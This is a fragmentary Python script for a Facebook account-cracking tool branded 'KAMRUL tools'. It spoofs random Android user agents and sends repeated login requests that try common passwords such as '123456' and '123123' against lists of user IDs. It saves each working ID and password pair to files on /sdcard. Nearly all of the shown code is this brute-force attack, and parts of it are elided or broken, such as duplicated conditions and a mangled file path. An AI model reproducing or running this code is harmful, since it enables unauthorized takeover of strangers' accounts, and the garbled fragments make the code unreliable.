...
for xd in range(10000): 	
   ...
   ugen.append(uaku2)
for xd in range(10000): 	
   aa='Mozilla/5.0 (VIVO S1; Android 10;'
   b=random.choice(['7.0','8.1.0','9','10','11','12'])
...
os.system('espeak -a 300 "well,come to,KAMRUL, tools"')
logo = f"""
\033[0;92m
...
\33[38;5;160m \033[1;99m  \33[38;5;160m \033[1;32mOWNER      \33[38;5;160m▶  \033[1;96mRJ KAMRUL
\33[38;5;160m \033[1;99m  \33[38;5;160m \033[1;32mFACEBOOK   \33[38;5;160m▶  \033[1;96mKAMRUL HASAN MAHI
\33[38;5;160m \033[1;99m  \33[38;5;160m \033[1;32mPAID    \33[38;5;160m▶  \033[1;96m ACCESS PREMIUM 
\33[38;5;160m \033[1;99m  \33[38;5;160m \033[1;32mVERSION    \33[38;5;160m▶  \033[1;96m10.00
\33[38;5;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
    ...
    try:
        ...
        for pw in ["123456","1234567","12345678"," 1234567890","123123","123456789","111222"]:
            ...
            if "session_key" in rp:            	
                ...
                print(f'\r\r\r\r\r\33[38;5;208m[KAMRUL-CP] {uid} ● {pw}')
                open("/sdcard/KAMRUL-M1-OLD-CP.txt", "a").write(uid + "|" + pw + "\n")
                cps.append(uid)
                break
            elif "session_key" in rp:
                print(f'\r\r\r\r\r\33[38;5;46m[KAMRUL-OK] {uid} ● {pw}')
                os.system('espeak -a 300 "Cracked Ok id,"')
                open("/sdcard/KAMRUL-M1-OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
...
def login2(uid):
    ...
    try:
        ...
        ua = random.choice(ugen)
        ua = windows()
        for pw in ["123456","1234567","12345678"," 1234567890","123123","123456789","111222","1234567890","123123","102030"]:
            data = {'adid':str(uuid.uuid4()),
            'format': 'json',
            'device_id':str(uuid.uuid4()),
            'cpl': 'true',
            ...
            rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
            if "session_key" in rp:            	
                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mKAMRULm\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                open("/sdcard/KAMRUL-M1-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                cps.append(uid)
                break
            elif "www.facebook.com" in rp['error']['message']:
...
def login3(uid):
    ...
    Session=requests.session()
    try:
        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mKAMRUL\33[38;5;37m-\x1b[38;5;46mB3\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
        sys.stdout.flush()
        ua = random.choice(ugen)
        ua = windows()
        for pw in ["123456","1234567","12345678"," 1234567890","123123","123456789","111222"]:
            ...
            rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
            if "session_key" in rp:            	
                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mKAMRUL\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                open("/sdcard/KAMRUL-M2-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                cps.append(uid)
                break
            elif "www.facebook.com" in rp['error']['message']:
                print(f'\r\r\r\r\r\33[38;5;208m[KAMRUL-CP] {uid} ● {pw}')
                ...
                print(f'\r\r\r\r\r\33[38;5;46m[KAMRUL-OK] {uid} ● {pw}')
                os.system('espeak -a 300 "Cracked Ok id,"')
                open("/sdcardgKAMRUL-M1-OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
...
def login4(uid):
    ...
    Session=requests.session()
    try:
        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mKAMRUL\33[38;5;37m-\x1b[38;5;46mS1\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
        sys.stdout.flush()
        ua = random.choice(ugen)
        ua = windows()
        for pw in ["123456","1234567","12345678"," 1234567890","123123","123456789","111222"]:
            ...
            if "session_key" in rp:            	
                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mKAMRUL\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                open("/sdcard/KAMRUL-M3-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                cps.append(uid)
                break
            elif "www.facebook.com" in rp['error']['message']:
                print(f'\r\r\r\r\r\33[38;5;208m[KAMRUL-CP] {uid} ● {pw}')
